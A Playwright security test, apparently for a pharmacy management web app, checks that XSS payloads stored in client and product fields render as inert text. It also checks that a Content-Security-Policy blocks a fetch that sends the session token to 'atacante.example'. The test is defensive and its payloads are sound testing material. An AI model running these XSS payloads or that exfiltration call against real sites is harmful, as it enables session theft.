// Seguridad en el navegador: datos maliciosos guardados por un empleado no deben ejecutarse en la pantalla de otro
const { chromium } = require('playwright'); const mock = require('./mock');
(async () => {
  const b = await chromium.launch(); let fallas = 0; const ok = (c, m) => { console.log((c ? 'ok   ' : 'FALLA ') + m); if (!c) fallas++; };
  const malo = '<img src=x onerror="window.__robado=1">';
  const ataque = '"><img src=x onerror="window.__robado=2">';
  const pg = await (await b.newContext()).newPage();
  mock(pg, { rest: async (st, { p, m, q }) => { const uno = (q.headers()['accept'] || '').includes('vnd.pgrst.object');
    if (p === '/rest/v1/clientes') return { body: [{ id: 1, empresa_id: 'E', cedula_rif: 'V-1', nombre: malo, telefono: ataque, visitas: 2, total_usd: 5, puntos: 5 }] };
    if (p === '/rest/v1/productos') return { body: [{ id: 1, empresa_id: 'E', codigo: '1', codigos_alt: [], nombre: malo, principio_activo: ataque, laboratorio: malo, presentacion: malo, seccion: malo, iva: 'E', costo: 1, margen: 30, precio: 1.3, por_lote: false, minimo: 5, rx: false, controlado: false, historial: [] }] };
    if (p === '/rest/v1/colecciones') return { body: [{ nombre: 'equipo_fallas', datos: [{ p: malo, u: malo, f: '01/11/2026', h: '10:00' }] }] };
    if (m === 'GET' && p.startsWith('/rest/v1/') && !p.includes('rpc')) return { body: uno ? null : [] }; } });
  await pg.goto('http://localhost:8765/farmacia.html'); await pg.fill('#lu', 'jose@azullab.com'); await pg.fill('#lp', 'clave-buena'); await pg.click('#loginForm [type=submit]');
  await pg.waitForFunction(() => typeof S === 'object' && S.view !== 'login', null, { timeout: 8000 });
  for (const v of ['dashboard', 'clients', 'products', 'pos', 'inventory', 'loyalty', 'reports']) { await pg.evaluate(x => go(x), v).catch(() => {}); await pg.waitForTimeout(150); }
  await pg.evaluate(() => { openModal(clientModal(0)); }).catch(() => {}); await pg.waitForTimeout(200);
  ok(!(await pg.evaluate(() => window.__robado)), 'un nombre con código escondido no se ejecuta en la pantalla del dueño');
  ok(!(await pg.$('#app img[src="x"], #modal img[src="x"]')), 'ni se convierte en una etiqueta de la página');
  ok(await pg.evaluate(() => CLIENTS[0].name.startsWith('‹img') && P[0].name.startsWith('‹img')), 'el nombre se ve como texto, sin peligro');
  // Segunda capa: aunque se colara código, no puede mandar datos a otro sitio
  const enviado = await pg.evaluate(async () => { try { await fetch('https://atacante.example/robar?d=' + encodeURIComponent(localStorage.getItem('cuadre.sesion') || '')); return true; } catch (e) { return false; } });
  ok(!enviado, 'la página no puede mandar la sesión a un sitio de un atacante');
  ok(await pg.evaluate(() => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]')), 'la política de seguridad de contenido está activa');
  await b.close(); process.exit(fallas ? 1 : 0);
})();
